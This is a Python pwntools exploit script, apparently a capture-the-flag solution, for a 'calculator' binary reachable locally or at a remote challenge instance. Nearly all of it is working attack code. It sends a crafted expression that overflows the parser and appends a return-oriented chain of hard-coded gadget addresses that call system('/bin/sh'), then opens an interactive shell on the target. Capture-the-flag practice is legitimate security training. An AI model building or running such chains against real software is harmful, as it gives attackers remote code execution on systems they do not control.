from pwn import *

CMDLINE = ["./calculator"]

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1337
    REMOTE_HOST = "instances.challenge-ecw.fr"
    REMOTE_PORT = 42567
    
    def __init__(self) -> None:
        if args.REMOTE:
            self.io = remote(self.REMOTE_HOST, self.REMOTE_PORT)
        elif args.LOCAL:
            self.io = remote(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            self.io = process(CMDLINE)
            if args.DBG:
                print(self.io.pid)
                pause()

    def send_expression(self, expression: bytes):
        self.io.sendlineafter(b">> ", expression)

    def interactive(self):
        self.io.interactive()
    
    def close(self):
        self.io.close()

io = Exploit()

binsh = 0x400092c6c8
set_s0 = 0x4000889358
set_a0 = 0x40008a261c
system = 0x4000869688

expression = b"(1**9000)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)----------(1)("
expression += str(set_s0).encode()
expression += b")\0"
expression += p64(binsh)
expression += p64(set_a0)
expression += b'A'*0x8
expression += p64(system)

io.send_expression(expression)
io.interactive()
io.close()